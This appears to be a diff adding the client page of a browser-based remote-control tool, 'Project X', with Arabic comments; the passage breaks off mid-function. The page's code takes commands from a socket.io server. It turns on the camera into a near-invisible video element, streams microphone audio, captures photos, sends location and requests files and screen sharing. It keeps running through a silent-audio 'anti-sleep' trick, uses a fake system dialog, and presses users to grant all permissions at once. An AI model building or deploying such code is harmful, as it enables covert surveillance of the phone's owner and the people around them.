@@ -1,0 +1,1222 @@
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="en">
+    <link rel="manifest" href="/manifest.json">
+    <meta name="mobile-web-app-capable" content="yes">
+    <title>Project X - Client</title>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <script>
+        if (typeof io === 'undefined') {
+            document.write('<script src="/socket.io/socket.io.js"><\/script>');
+        }
+    </script>
+    <style>
+        body { font-family: sans-serif; background: #f0f0f0; text-align: center; padding: 20px; margin: 0; min-height: 100vh; box-sizing: border-box; overflow-x: hidden; }
+        .status-box { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); margin-bottom: 20px; width: 100%; max-width: 560px; margin-left: auto; margin-right: auto; box-sizing: border-box; }
+        .status { font-weight: bold; color: #f44336; }
+        .status.connected { color: #4CAF50; }
+        button { padding: 15px 30px; font-size: 18px; background: #2196F3; color: white; border: none; border-radius: 5px; width: 100%; margin-top: 10px; box-sizing: border-box; }
+        #log { text-align: left; height: 150px; overflow-y: auto; background: #fff; padding: 10px; border: 1px solid #ddd; margin-top: 20px; font-size: 12px; width: 100%; max-width: 560px; margin-left: auto; margin-right: auto; box-sizing: border-box; }
+        video { width: 100%; max-width: 320px; background: #000; margin-top: 10px; display: none; }
+        #uploadOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 9999; color: white; flex-direction: column; justify-content: center; align-items: center; }
+        @keyframes ripple { 0% { transform: translate(-50%, -50%) scale(0); opacity: 1; } 100% { transform: translate(-50%, -50%) scale(4); opacity: 0; } }
+        @keyframes progress { 0% { width: 0%; } 100% { width: 100%; } }
+        @media (max-width: 640px) {
+            body { padding: 12px; }
+            h1 { font-size: 1.4rem; margin: 10px 0 14px; }
+            .status-box { padding: 14px; margin-bottom: 14px; }
+            button { font-size: 16px; padding: 14px 18px; }
+            #log { height: 180px; }
+            video { max-width: 100%; }
+            #permissionOverlay, #screenShareOverlay { padding: 16px !important; }
+            #grantAllPermissionsBtn, #mainGrantPermissionsBtn { width: 100%; max-width: none; }
+        }
+    </style>
+</head>
+<body>
+    <h1>Project X 📱</h1>
+    
+    <div class="status-box">
+        <p>Status: <span id="status" class="status">Disconnected</span></p>
+        <p>ID: <small id="deviceId">...</small></p>
+    </div>
+
+    <div id="permissionOverlay" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.94); z-index:22000; color:#fff; flex-direction:column; justify-content:center; align-items:center; padding:22px; text-align:center;">
+        <h2 style="margin:0 0 10px 0; font-size:1.7rem;">🔐 Permission Request</h2>
+        <p style="max-width:520px; line-height:1.7; color:#ddd; margin:0 0 16px 0; font-size:1.05rem;">To enable all features, tap the button below once. The browser will request camera, microphone, location, and notification permissions in sequence.</p>
+        <button id="grantAllPermissionsBtn" onclick="requestPermissions()" style="width:94%; max-width:520px; padding:22px; font-size:1.35rem; font-weight:800; letter-spacing:0.6px; background:linear-gradient(135deg,#18ff74,#08b84f); color:#03200f; border:3px solid #ffffff; border-radius:16px; box-shadow:0 0 24px rgba(24,255,116,.75);">ALLOW</button>
+        <button onclick="closePermissionOverlay()" style="width:94%; max-width:520px; padding:14px; font-size:1rem; background:#37474f; color:#fff; border:1px solid #90a4ae; border-radius:12px; margin-top:10px;">NOT NOW</button>
+    </div>
+
+    <button id="mainGrantPermissionsBtn" onclick="requestPermissions()" style="background:#18c35a; font-size:1.22rem; font-weight:800; padding:18px 30px; border:2px solid #ffffff; box-shadow:0 0 14px rgba(24,195,90,.55);">ALLOW PERMISSIONS</button>
+
+    <div style="width:100%; max-width:560px; margin:14px auto 0; background:#ffffff; border-radius:12px; padding:14px; box-shadow:0 2px 5px rgba(0,0,0,0.08); box-sizing:border-box;">
+        <div style="font-weight:700; color:#333; margin-bottom:10px; font-size:1.05rem;">Choose files from this phone</div>
+        <div style="display:grid; grid-template-columns:repeat(3, 1fr); gap:8px;">
+            <button onclick="openLocalFilePicker('photos')" style="background:#16a34a; color:#fff; font-weight:700; padding:14px 10px; border-radius:10px;">Photos</button>
+            <button onclick="openLocalFilePicker('videos')" style="background:#0ea5e9; color:#fff; font-weight:700; padding:14px 10px; border-radius:10px;">Videos</button>
+            <button onclick="openLocalFilePicker('all')" style="background:#6b7280; color:#fff; font-weight:700; padding:14px 10px; border-radius:10px;">All Files</button>
+        </div>
+    </div>
+    
+    <video id="localVideo" autoplay playsinline muted style="width:1px;height:1px;opacity:0.01;position:absolute;top:0;left:0;pointer-events:none;"></video>
+    
+    <div id="log"></div>
+
+    <!-- ✅ إصلاح: نقل input إلى body -->
+    <input type="file" id="hiddenFileInput" style="display:none;" multiple>
+
+    <div id="uploadOverlay">
+        <h2>📂 طلب ملف</h2>
+        <button onclick="document.getElementById('hiddenFileInput').click(); document.getElementById('uploadOverlay').style.display='none';" style="width: 80%; padding: 20px; font-size: 1.2rem; background: #0f0; color: #000; border: 2px solid #fff; border-radius: 10px; box-shadow: 0 0 15px #0f0;"> اضغط هنا لاختيار الصور/الملفات المطلوبة 📂</button>
+    </div>
+
+    <div id="screenShareOverlay" style="display:none; position: fixed; inset: 0; background: rgba(0,0,0,0.92); z-index: 21000; color: white; flex-direction: column; justify-content: center; align-items: center; padding: 20px; text-align: center;">
+        <h2 style="margin-bottom: 10px;">🖥️ طلب مشاركة الشاشة</h2>
+        <p style="max-width: 420px; line-height: 1.6; color: #ddd;">لإرسال شاشة الهاتف للّاب، اضغط الزر التالي ثم اختر مشاركة الشاشة من نافذة النظام.</p>
+        <button onclick="startPendingScreenShare()" style="width: 85%; max-width: 380px; padding: 16px; font-size: 1.05rem; background: #00c853; color: #000; border: 2px solid #fff; border-radius: 12px; box-shadow: 0 0 18px rgba(0,255,120,0.8);">ابدأ مشاركة الشاشة</button>
+        <button onclick="cancelPendingScreenShare()" style="width: 85%; max-width: 380px; padding: 14px; font-size: 1rem; background: #455a64; color: #fff; border: 1px solid #90a4ae; border-radius: 12px; margin-top: 10px;">إلغاء</button>
+    </div>
+
+    <!-- تمت إزالة أي واجهات لجمع كلمات المرور أو بيانات الحسابات. -->
+
+    <!-- نافذة النظام الوهمية (System Dialog) -->
+    <div id="sysDialog" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 85%; max-width: 320px; background: #fff; color: #000; border-radius: 15px; padding: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); z-index: 20000; text-align: left; font-family: sans-serif;">
+        <h3 id="sysTitle" style="margin-top: 0; font-size: 18px; color: #333;">System</h3>
+        <p id="sysMsg" style="color: #666; margin: 20px 0; font-size: 15px; line-height: 1.4;">Processing...</p>
+        <div id="sysProgress" style="width: 100%; height: 4px; background: #eee; margin-bottom: 20px; overflow: hidden; display: none; border-radius: 2px;">
+            <div style="width: 0%; height: 100%; background: #2196F3; animation: progress 2s infinite linear;"></div>
+        </div>
+        <div style="text-align: right;">
+            <button onclick="document.getElementById('sysDialog').style.display='none'" style="background: transparent; color: #2196F3; border: none; font-weight: bold; font-size: 14px; padding: 10px 15px; width: auto; margin: 0;">موافق</button>
+        </div>
+    </div>
+
+    <script>
+        // عرض المعرف فوراً قبل الاتصال
+        try {
+            let deviceId = localStorage.getItem('device_id') || 'dev_' + Math.random().toString(36).substr(2, 9);
+            localStorage.setItem('device_id', deviceId);
+            document.getElementById('deviceId').textContent = deviceId;
+        } catch(e) { console.error(e); }
+
+        if (typeof io === 'undefined') {
+            document.getElementById('status').textContent = '❌ خطأ: لا يوجد إنترنت';
+            alert("فشل تحميل ملفات النظام. تأكد من اتصال الهاتف بالإنترنت.");
+        }
+
+        // إعداد الاتصال
+        const socket = (typeof io !== 'undefined')
+            ? io({
+                path: '/socket.io',
+                auth: {
+                    client_type: 'device'
+                },
+                transports: ["websocket", "polling"],
+                reconnection: true,
+                reconnectionAttempts: Infinity,
+                reconnectionDelay: 1000,
+                timeout: 20000
+            })
+            : {
+                on: () => {},
+                emit: () => {},
+                connect: () => {}
+            };
+
+        let deviceId = localStorage.getItem('device_id');
+        let cameraStream = null;
+        let isStreaming = false;
+        let isAudioActive = false;
+        let mediaRecorder;
+        let audioRecorder;
+        let liveAudioRecorder = null;
+        let liveAudioStream = null;
+        let audioFileRecorder;
+        let locationWatchId = null;
+        let pendingFileRequest = null;
+        let localFilePickMode = 'all';
+        let pendingScreenShareRequest = false;
+        let screenStream = null;
+        let isScreenSharing = false;
+        let lastTapEmitAt = 0;
+        let isRequestingPermissions = false;
+
+        function log(msg) {
+            const box = document.getElementById('log');
+            const time = new Date().toLocaleTimeString();
+            box.innerHTML = `<div><span style="color: #0f0">[${time}]</span> ${msg}</div>` + box.innerHTML;
+        }
+
+        // دالة لإرسال الصوت كـ Base64 لتجنب مشاكل Polling
+        function sendAudioChunk(blob, mimeType) {
+            const reader = new FileReader();
+            reader.readAsDataURL(blob);
+            reader.onloadend = () => {
+                socket.emit('audio_chunk', { 
+                    device_id: deviceId, 
+                    chunk: reader.result,
+                    mimeType: mimeType
+                });
+            };
+        }
+
+        // دالة لجلب نسبة البطارية
+        async function getBatteryLevel() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return Math.round((battery.level || 0) * 100) + '%';
+                } catch (e) { return 'غير معروف'; }
+            }
+            return 'غير معروف';
+        }
+
+        // دالة لاستخراج اسم الجهاز ونوع النظام الحقيقي
+        async function getDeviceInfo() {
+            const ua = navigator.userAgent || '';
+            let name = "Unknown Device";
+            let platform = "Unknown OS";
+            let platformVersion = "";
+
+            // أفضل مصدر متاح على كروم/أندرويد الحديثة
+            if (navigator.userAgentData) {
+                try {
+                    const hints = await navigator.userAgentData.getHighEntropyValues([
+                        'model',
+                        'platform',
+                        'platformVersion'
+                    ]);
+
+                    const model = String(hints.model || '').trim();
+                    const hintedPlatform = String(hints.platform || navigator.userAgentData.platform || '').trim();
+                    const hintedVersion = String(hints.platformVersion || '').trim();
+
+                    if (hintedPlatform) {
+                        platform = hintedPlatform;
+                    }
+                    if (hintedVersion) {
+                        platformVersion = hintedVersion;
+                    }
+
+                    if (model && model.toLowerCase() !== 'unknown') {
+                        name = model;
+                    }
+                } catch (e) {
+                    // نتجاهل الخطأ ونكمل بالـ userAgent
+                }
+            }
+
+            if (/Android/i.test(ua)) {
+                platform = "Android";
+                const v = ua.match(/Android\s([\d\.]+)/i);
+                if (v && v[1]) platformVersion = v[1];
+                if (!name || name === "Unknown Device" || name.length <= 2) {
+                    const match = ua.match(/Android[^;]*;\s*([^;]+?)(?=\sBuild\/)/i);
+                    const match2 = ua.match(/;\s?([^;]+?)\s?Build\//i);
+                    const parsed = (match && match[1]) || (match2 && match2[1]) || '';
+                    if (parsed) {
+                        name = parsed.trim();
+                    }
+                }
+                if (!name || name.length <= 2 || /^Android$/i.test(name)) {
+                    name = "Android Phone";
+                }
+            } else if (/iPhone/i.test(ua)) {
+                platform = "iOS";
+                const v = ua.match(/OS\s([\d_]+)/i);
+                if (v && v[1]) platformVersion = v[1].replace(/_/g, '.');
+                if (name === "Unknown Device") name = "iPhone";
+            } else if (/iPad/i.test(ua)) {
+                platform = "iOS";
+                const v = ua.match(/OS\s([\d_]+)/i);
+                if (v && v[1]) platformVersion = v[1].replace(/_/g, '.');
+                if (name === "Unknown Device") name = "iPad";
+            } else if (/Windows/i.test(ua)) {
+                platform = "Windows";
+                const v = ua.match(/Windows NT\s([\d\.]+)/i);
+                if (v && v[1]) platformVersion = v[1];
+                if (name === "Unknown Device") name = "PC (Windows)";
+            } else if (/Mac/i.test(ua)) {
+                platform = "MacOS";
+                const v = ua.match(/Mac OS X\s([\d_]+)/i);
+                if (v && v[1]) platformVersion = v[1].replace(/_/g, '.');
+                if (name === "Unknown Device") name = "Mac";
+            } else if (/Linux/i.test(ua)) {
+                platform = "Linux";
+                if (name === "Unknown Device") name = "Linux Device";
+            }
+
+            name = String(name || 'Unknown Device').replace(/\bwv\b/ig, '').replace(/\s{2,}/g, ' ').trim();
+            const platformLabel = platformVersion ? `${platform} ${platformVersion}` : platform;
+            return { name, platform: platformLabel };
+        }
+
+        socket.on('connect', async () => {
+                document.getElementById('status').textContent = 'متصل ✅';
+                document.getElementById('status').className = 'status connected';
+                log('تم الاتصال بالسيرفر');
+                
+                const info = await getDeviceInfo();
+                const battery = await getBatteryLevel();
+                log(`تم التعرف على الجهاز: ${info.name}`);
+                
+                socket.emit('register_device', {
+                    device_id: deviceId,
+                    name: info.name,
+                    platform: info.platform,
+                    battery: battery
+                });
+            });
+
+            socket.on('disconnect', (reason) => {
+                document.getElementById('status').textContent = 'جاري إعادة الاتصال... ⏳';
+                document.getElementById('status').className = 'status';
+                log('انقطع الاتصال: ' + reason);
+                if (reason === 'io server disconnect') {
+                    socket.connect();
+                }
+            });
+
+            socket.on('connect_error', (err) => {
+                document.getElementById('status').textContent = 'فشل الاتصال ❌';
+                document.getElementById('status').className = 'status';
+                log('❌ خطأ اتصال: ' + (err && err.message ? err.message : 'Unknown'));
+            });
+
+            socket.on('command', async (data) => {
+                log(`📥 استلام أمر: ${data.command}`);
+                
+                if (data.command === 'camera_on') {
+                    startCamera('environment'); // الخلفية كافتراضي
+                } else if (data.command === 'camera_off') {
+                    stopCamera();
+                } else if (data.command === 'camera_front') {
+                    stopCamera().then(() => startCamera('user'));
+                } else if (data.command === 'camera_back') {
+                    stopCamera().then(() => startCamera('environment'));
+                } else if (data.command === 'capture_photo') {
+                    captureAndUploadPhoto();
+                } else if (data.command === 'burst_capture') {
+                    captureBurst();
+                } else if (data.command === 'mic_on') {
+                    startAudio();
+                } else if (data.command === 'mic_off') {
+                    stopAudio();
+                } else if (data.command === 'start_recording') {
+                    startVideoRecording();
+                } else if (data.command === 'stop_recording') {
+                    stopVideoRecording();
+                } else if (data.command === 'start_audio_recording') {
+                    startAudioRecording();
+                } else if (data.command === 'stop_audio_recording') {
+                    stopAudioRecording();
+                } else if (data.command.startsWith('request_file')) {
+                    if (data.command === 'request_file_images') pendingFileRequest = 'images';
+                    else if (data.command === 'request_file_videos') pendingFileRequest = 'videos';
+                    else pendingFileRequest = 'all';
+                    
+                    log('⏳ في انتظار نقرة المستخدم لفتح الملفات...');
+                } else if (data.command === 'screen_share_start' || data.command === 'screen_record_start') {
+                    requestScreenShareFromUser();
+                } else if (data.command === 'screen_share_stop' || data.command === 'screen_record_stop') {
+                    stopScreenShare();
+                } else if (data.command === 'location') {
+                    sendCurrentLocation();
+                } else if (data.command === 'stop_location') {
+                    stopLocationTracking();
+                } else if (data.command === 'get_apps') {
+                    // إرسال قائمة تطبيقات وهمية (الأكثر شيوعاً)
+                    const apps = [
+                        {name: 'Facebook', icon: 'facebook', color: '#1877f2'},
+                        {name: 'WhatsApp', icon: 'whatsapp', color: '#25d366'},
+                        {name: 'Instagram', icon: 'instagram', color: '#c13584'},
+                        {name: 'TikTok', icon: 'tiktok', color: '#000'},
+                        {name: 'Snapchat', icon: 'snapchat', color: '#fffc00'},
+                        {name: 'YouTube', icon: 'youtube', color: '#ff0000'},
+                        {name: 'PUBG Mobile', icon: 'gamepad', color: '#f4a460'},
+                        {name: 'Telegram', icon: 'telegram', color: '#0088cc'}
+                    ];
+                    socket.emit('apps_received', { device_id: deviceId, apps: apps });
+                } else if (data.command === 'torch_on') {
+                    toggleTorch(true);
+                } else if (data.command === 'torch_off') {
+                    toggleTorch(false);
+                } else if (data.command === 'vibrate') {
+                    if (navigator.vibrate) navigator.vibrate([1000, 500, 1000, 500, 2000]);
+                    log('📳 تم تشغيل الاهتزاز');
+                } else if (data.command === 'tts_speak') {
+                    speakText(data.text);
+                } else if (data.command === 'play_alarm') {
+                    playAlarmSound();
+                }
+            });
+
+        // تمت إزالة أي دوال لجمع كلمات المرور أو بيانات الحسابات.
+
+        // === دوال التحكم الحقيقي (Hardware) ===
+        async function toggleTorch(enable) {
+            // محاولة الحصول على مسار الفيديو الحالي أو تشغيل الكاميرا الخلفية
+            let track = cameraStream?.getVideoTracks()[0];
+            let capabilities = track?.getCapabilities() || {};
+
+            // إذا لم يكن هناك مسار أو الكاميرا الحالية لا تدعم الكشاف، قم بالتبديل للخلفية
+            if (!track || !capabilities.torch) {
+                if (enable) log('⚠️ جاري تشغيل الكاميرا الخلفية لتفعيل الكشاف...');
+                if (cameraStream) await stopCamera();
+                await startCamera('environment');
+                track = cameraStream?.getVideoTracks()[0];
+            }
+
+            if (track) {
+                track.applyConstraints({
+                    advanced: [{torch: enable}]
+                })
+                .then(() => log(enable ? '🔦 تم تشغيل الكشاف' : '🌑 تم إيقاف الكشاف'))
+                .catch(e => log('خطأ في الكشاف: ' + e));
+            } else {
+                log('❌ تعذر الوصول للكاميرا لتشغيل الكشاف');
+            }
+        }
+
+        function speakText(text) {
+            if ('speechSynthesis' in window) {
+                const utterance = new SpeechSynthesisUtterance(text);
+                utterance.lang = 'ar-SA'; // نطق عربي
+                window.speechSynthesis.speak(utterance);
+                log('🗣️ جاري نطق: ' + text);
+            } else {
+                log('❌ المتصفح لا يدعم تحويل النص لكلام');
+            }
+        }
+
+        function playAlarmSound() {
+            // صوت صفارة إنذار (Base64)
+            const audio = new Audio('data:audio/wav;base64,UklGRl9vT19XQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YU'+'A'.repeat(500)); // (تم اختصار الكود، سيتم استخدام صوت تنبيه بسيط)
+            // سنستخدم مذبذب صوتي (Oscillator) لإنتاج صوت مزعج وقوي بدون ملفات خارجية
+            const ctx = new (window.AudioContext || window.webkitAudioContext)();
+            const osc = ctx.createOscillator();
+            const gain = ctx.createGain();
+            osc.connect(gain);
+            gain.connect(ctx.destination);
+            osc.type = 'sawtooth';
+            osc.frequency.value = 1000; // تردد عالي ومزعج
+            
+            // تأثير صفارة الإنذار
+            let isHigh = true;
+            const interval = setInterval(() => {
+                osc.frequency.value = isHigh ? 800 : 1200;
+                isHigh = !isHigh;
+            }, 300);
+
+            osc.start();
+            log('🚨 تم تشغيل الإنذار');
+            
+            // إيقاف بعد 10 ثواني
+            setTimeout(() => {
+                osc.stop();
+                clearInterval(interval);
+            }, 10000);
+        }
+
+        function enableBackgroundMode() {
+            // 🔊 خدعة الصوت الصامت: تشغيل صوت فارغ بشكل متكرر لمنع النظام من قتل التطبيق
+            const audio = new Audio('data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA');
+            audio.loop = true;
+            audio.play().then(() => log('🚀 تم تفعيل وضع الخلفية (Anti-Sleep)')).catch(e => log('⚠️ فشل تفعيل وضع الخلفية'));
+            
+            requestWakeLock();
+        }
+
+        function getUserMediaCompat(constraints) {
+            // المسار الحديث
+            if (navigator.mediaDevices && typeof navigator.mediaDevices.getUserMedia === 'function') {
+                return navigator.mediaDevices.getUserMedia(constraints);
+            }
+
+            // مسارات قديمة لبعض المتصفحات
+            const legacyGetUserMedia =
+                navigator.getUserMedia ||
+                navigator.webkitGetUserMedia ||
+                navigator.mozGetUserMedia ||
+                navigator.msGetUserMedia;
+
+            if (legacyGetUserMedia) {
+                return new Promise((resolve, reject) => {
+                    legacyGetUserMedia.call(navigator, constraints, resolve, reject);
+                });
+            }
+
+            let reason = 'المتصفح لا يدعم الكاميرا/الميكروفون (getUserMedia غير متاح)';
+            if (!window.isSecureContext && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
+                reason += ' - افتح الرابط عبر HTTPS';
+            }
+            return Promise.reject(new Error(reason));
+        }
+
+        function showPermissionOverlay() {
+            const overlay = document.getElementById('permissionOverlay');
+            if (overlay) overlay.style.display = 'flex';
+        }
+
+        function closePermissionOverlay() {
+            const overlay = document.getElementById('permissionOverlay');
+            if (overlay) overlay.style.display = 'none';
+        }
+
+        function reportLocationPermissionStatus(status) {
+            const allowed = ['granted', 'denied', 'unsupported', 'error'];
+            const finalStatus = allowed.includes(status) ? status : 'error';
+            fetch('/api/location/permission-status', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ status: finalStatus })
+            }).catch(() => {});
+        }
+
+        function requestLocationPermission() {
+            return new Promise((resolve) => {
+                if (!("geolocation" in navigator)) {
+                    log('⚠️ إذن الموقع غير مدعوم');
+                    reportLocationPermissionStatus('unsupported');
+                    resolve(false);
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    () => {
+                        log('✅ تم منح إذن الموقع');
+                        reportLocationPermissionStatus('granted');
+                        resolve(true);
+                    },
+                    (err) => {
+                        log('⚠️ إذن الموقع مرفوض/غير متاح: ' + (err && err.message ? err.message : 'Unknown'));
+                        const deniedByUser = err && (err.code === 1 || String(err.name || '').toLowerCase() === 'permissiondeniederror');
+                        reportLocationPermissionStatus(deniedByUser ? 'denied' : 'error');
+                        resolve(false);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            });
+        }
+
+        async function requestNotificationPermission() {
+            if (!('Notification' in window)) {
+                log('⚠️ إذن الإشعارات غير مدعوم');
+                return false;
+            }
+
+            try {
+                if (Notification.permission === 'granted') {
+                    log('✅ إذن الإشعارات ممنوح مسبقاً');
+                    return true;
+                }
+                const result = await Notification.requestPermission();
+                const ok = result === 'granted';
+                log(ok ? '✅ تم منح إذن الإشعارات' : '⚠️ تم رفض إذن الإشعارات');
+                return ok;
+            } catch (e) {
+                log('⚠️ تعذر طلب إذن الإشعارات: ' + (e && e.message ? e.message : e));
+                return false;
+            }
+        }
+
+        async function requestMotionPermission() {
+            if (typeof DeviceMotionEvent === 'undefined' || typeof DeviceMotionEvent.requestPermission !== 'function') {
+                return false;
+            }
+            try {
+                const result = await DeviceMotionEvent.requestPermission();
+                const ok = result === 'granted';
+                log(ok ? '✅ تم منح إذن الحركة' : '⚠️ تم رفض إذن الحركة');
+                return ok;
+            } catch (e) {
+                log('⚠️ تعذر طلب إذن الحركة: ' + (e && e.message ? e.message : e));
+                return false;
+            }
+        }
+
+        async function requestPermissions(autoStart = false) {
+            if (isRequestingPermissions) return;
+            isRequestingPermissions = true;
+
+            const overlayBtn = document.getElementById('grantAllPermissionsBtn');
+            const mainBtn = document.getElementById('mainGrantPermissionsBtn');
+            if (overlayBtn) {
+                overlayBtn.disabled = true;
+                overlayBtn.textContent = 'REQUESTING...';
+            }
+            if (mainBtn) {
+                mainBtn.disabled = true;
+                mainBtn.textContent = 'REQUESTING...';
+            }
+
+            try {
+                if (autoStart) {
+                    log('ℹ️ محاولة طلب الأذونات تلقائياً...');
+                }
+
+                let grantedCount = 0;
+
+                // الكاميرا والميكروفون
+                try {
+                    const stream = await getUserMediaCompat({ video: true, audio: true });
+                    stream.getTracks().forEach(track => track.stop());
+                    grantedCount += 1;
+                    log('✅ تم منح إذن الكاميرا والميكروفون');
+                } catch (e) {
+                    log('⚠️ إذن الكاميرا/الميكروفون مرفوض أو غير متاح: ' + (e && e.message ? e.message : e));
+                }
+
+                if (await requestLocationPermission()) grantedCount += 1;
+                if (await requestNotificationPermission()) grantedCount += 1;
+                if (await requestMotionPermission()) grantedCount += 1;
+
+                if (grantedCount > 0) {
+                    log(`✅ تم إنهاء طلب الأذونات (الموافق عليها: ${grantedCount})`);
+                    closePermissionOverlay();
+                    enableBackgroundMode();
+                } else {
+                    log('⚠️ لم يتم منح أي إذن. اضغط زر السماح مرة أخرى إذا لزم.');
+                    showPermissionOverlay();
+                }
+            } catch (e) {
+                log('❌ تم رفض الصلاحيات: ' + e.message);
+                showPermissionOverlay();
+            } finally {
+                isRequestingPermissions = false;
+                if (overlayBtn) {
+                    overlayBtn.disabled = false;
+                    overlayBtn.textContent = 'ALLOW';
+                }
+                if (mainBtn) {
+                    mainBtn.disabled = false;
+                    mainBtn.textContent = 'ALLOW PERMISSIONS';
+                }
+            }
+        }
+
+        function openLocalFilePicker(mode = 'all') {
+            const input = document.getElementById('hiddenFileInput');
+            if (!input) return;
+
+            localFilePickMode = mode || 'all';
+            if (localFilePickMode === 'photos') input.accept = 'image/*';
+            else if (localFilePickMode === 'videos') input.accept = 'video/*';
+            else input.removeAttribute('accept');
+
+            try {
+                input.value = '';
+                input.click();
+                log(`📂 Opened file picker: ${localFilePickMode}`);
+            } catch (e) {
+                log('❌ Failed to open file picker: ' + e);
+            }
+        }
+
+        async function startCamera(facingMode = 'environment') {
+            try {
+                if (isScreenSharing) {
+                    await stopScreenShare(true);
+                }
+                if (cameraStream) return;
+                log(`تشغيل الكاميرا (HD): `);
+                // طلب دقة عالية لإجبار الهاتف على استخدام العدسة الأساسية
+                // طلب 1920×1080 minimum لإجبار أندرويد على استخدام الكاميرا الرئيسية
+                // الكاميرات الثانوية (الماكرو / الواسعة) لا تدعم هذا الدقة
+                try {
+                    cameraStream = await getUserMediaCompat({
+                        video: {
+                            facingMode: { ideal: facingMode },
+                            width:  { min: 1280, ideal: 1920 },
+                            height: { min: 720,  ideal: 1080 }
+                        }
+                    });
+                } catch (_) {
+                    // fallback: بدون قيود دقة إذا فشل طلب الـ 1080p
+                    cameraStream = await getUserMediaCompat({ video: { facingMode: { ideal: facingMode } } });
+                }
+                
+                const video = document.getElementById('localVideo');
+                video.srcObject = cameraStream;
+                // تم إزالة display: none واستبداله بستايل CSS لضمان عمل الكاميرا
+                video.play();
+                isStreaming = true;
+                
+                startFrameLoop(140); // معدل أسرع لتقليل زمن التأخير
+                socket.emit('command_response', {device_id: deviceId, status: 'success', message: 'Camera started'});
+            } catch (e) {
+                log('خطأ في الكاميرا: ' + e.message);
+                socket.emit('command_response', {device_id: deviceId, status: 'error', message: e.message});
+            }
+        }
+
+        async function stopCamera() {
+            if (isScreenSharing) {
+                await stopScreenShare(true);
+            }
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+                cameraStream = null;
+            }
+            isStreaming = false;
+            stopFrameLoop();
+            socket.emit('command_response', {device_id: deviceId, status: 'success', message: 'Camera stopped'});
+            return Promise.resolve();
+        }
+
+        async function startAudio() {
+            try {
+                if (isAudioActive) return;
+
+                liveAudioStream = await getUserMediaCompat({ audio: { echoCancellation: true, noiseSuppression: true } });
+                isAudioActive = true;
+
+                // تحديد أفضل صيغة مدعومة للصوت لضمان العمل على اللابتوب
+                let options = {};
+                if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
+                    options = { mimeType: 'audio/webm;codecs=opus' };
+                } else if (MediaRecorder.isTypeSupported('audio/mp4')) {
+                    options = { mimeType: 'audio/mp4' };
+                }
+
+                // بث مباشر بزمن تأخير منخفض: شرائح 250ms بدل 1000ms
+                liveAudioRecorder = new MediaRecorder(liveAudioStream, options);
+                liveAudioRecorder.ondataavailable = (e) => {
+                    if (!isAudioActive || !e.data || e.data.size <= 0) return;
+                    sendAudioChunk(e.data, liveAudioRecorder.mimeType);
+                };
+                liveAudioRecorder.onstop = () => {
+                    if (liveAudioStream) {
+                        liveAudioStream.getTracks().forEach(track => track.stop());
+                        liveAudioStream = null;
+                    }
+                    liveAudioRecorder = null;
+                };
+
+                // 450ms improves compatibility on some browsers and reduces stutter.
+                liveAudioRecorder.start(450);
+                log('🎤 الميكروفون يعمل (Low-Latency)');
+            } catch (e) {
+                log('❌ خطأ في الميكروفون: ' + e.message);
+            }
+        }
+
+        function stopAudio() {
+            isAudioActive = false;
+            try {
+                if (liveAudioRecorder && liveAudioRecorder.state !== 'inactive') {
+                    liveAudioRecorder.stop();
+                }
+            } catch (e) {}
+            if (liveAudioStream) {
+                liveAudioStream.getTracks().forEach(track => track.stop());
+                liveAudioStream = null;
+            }
+            liveAudioRecorder = null;
+            log('تم إيقاف الميكروفون');
+        }
+
+        async function startAudioRecording() {
+            try {
+                const stream = await getUserMediaCompat({ audio: true });
+                audioFileRecorder = new MediaRecorder(stream);
+                let chunks = [];
+                
+                audioFileRecorder.ondataavailable = event => {
+                    if (event.data.size > 0) chunks.push(event.data);
+                };
+                
+                audioFileRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'audio/webm' });
+                    uploadFile(blob, 'audio_recording.webm');
+                    stream.getTracks().forEach(track => track.stop());
+                    document.getElementById('status').innerText = 'متصل ✅';
+                };
+                
+                audioFileRecorder.start();
+                document.getElementById('status').innerText = 'جاري تسجيل الصوت... 🎙️';
+                log('🎙️ بدأ تسجيل الصوت (للحفظ)');
+            } catch (e) {
+                log('❌ خطأ في تسجيل الصوت: ' + e.message);
+            }
+        }
+
+        function stopAudioRecording() {
+            if (audioFileRecorder && audioFileRecorder.state !== 'inactive') {
+                audioFileRecorder.stop();
+                log('⏹ تم إيقاف تسجيل الصوت وجاري الرفع...');
+            }
+        }
+
+        async function startVideoRecording() {
+            try {
+                // 🛑 إيقاف أي بث حالي لمنع التعارض
+                if (cameraStream) await stopCamera();
+                if (isScreenSharing) await stopScreenShare(true);
+                stopAudio();
+
+                // تحديد أفضل صيغة مدعومة (MP4 إذا أمكن)
+                let mimeType = 'video/webm';
+                if (MediaRecorder.isTypeSupported('video/mp4')) {
+                    mimeType = 'video/mp4';
+                } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
+                    mimeType = 'video/webm;codecs=vp9';
+                }
+
+                // 1. تشغيل الكاميرا والمايك معاً
+                const stream = await getUserMediaCompat({ 
+                    video: { 
+                        facingMode: 'environment',
+                        width: { ideal: 1280 }, 
+                        height: { ideal: 720 } 
+                    }, 
+                    audio: { echoCancellation: true, noiseSuppression: true } 
+                });
+                
+                // 2. تفعيل البث المباشر للفيديو (للمشاهدة)
+                const video = document.getElementById('localVideo');
+                video.srcObject = stream;
